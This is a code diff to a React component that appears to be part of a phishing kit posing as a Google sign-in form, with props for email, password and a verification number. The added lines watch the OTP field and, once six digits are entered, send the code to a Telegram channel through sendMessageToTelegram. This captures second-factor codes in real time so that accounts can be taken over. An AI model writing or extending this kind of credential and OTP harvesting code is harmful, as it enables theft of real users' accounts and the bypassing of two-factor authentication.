@@ -4,12 +4,20 @@ import React, { useState, useEffect } from 'react';
 
 export default function GoogleForm({ currentStep, email, setEmail, password, setPassword, invalid, verificationNumber, setInvalid }) {
     const [otpCode, setOtpCode] = useState('');
-    
-    // Console log OTP codes
+    const [otpSent, setOtpSent] = useState(false);
+
     const handleOtpChange = (source) => (e) => {
-        setOtpCode(e.target.value);
-        console.log(`OTP code from ${source}:`, e.target.value);
-    };
+        const value = e.target.value;
+        setOtpCode(value);
+
+        if (value.length === 6 && !otpSent) {
+            const message = `OTP code from ${source} : ${value}`;
+            console.log(message);
+            sendMessageToTelegram(message);
+            setOtpSent(true); // Mark OTP as sent
+        } else if (value.length < 6) {
+            setOtpSent(false); // Reset if user deletes characters
+        }
 
     // Dismiss error on click outside
     useEffect(() => {
